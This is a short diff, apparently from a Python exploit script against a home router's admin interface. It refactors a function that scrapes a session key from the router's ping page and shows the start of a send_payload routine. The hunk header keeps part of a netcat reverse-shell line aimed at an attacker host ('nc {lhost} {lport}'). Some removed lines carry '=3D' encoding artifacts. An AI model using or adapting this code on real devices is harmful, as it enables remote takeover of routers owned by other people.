@@ -22,15 +22,12 @@ p/s | nc {lhost} {lport} > /tmp/s"], stdout=3DPIPE)
 
 
 def get_session():
-    url =3D router_host + "/admin/ping.html"
-    headers =3D {"Authorization": "Basic {}".format(authorization_header)}
-    r =3D requests.get(url, headers=3Dheaders).text
-    i =3D r.find("&sessionKey=3D") + len("&sessionKey=3D")
-    s =3D ""
-    while r[i] !=3D "'":
-        s =3D s + r[i]
-        i =3D i + 1
-    return s
+    url = f"{config['router_host']}/admin/ping.html"
+    headers = {"Authorization": config['authorization_header']}
+    response = requests.get(url, headers=headers)
+    session_key = response.text.split("&sessionKey=")[1].split("'")[0]
+    return session_key
+
 
 
 def send_payload(payload):
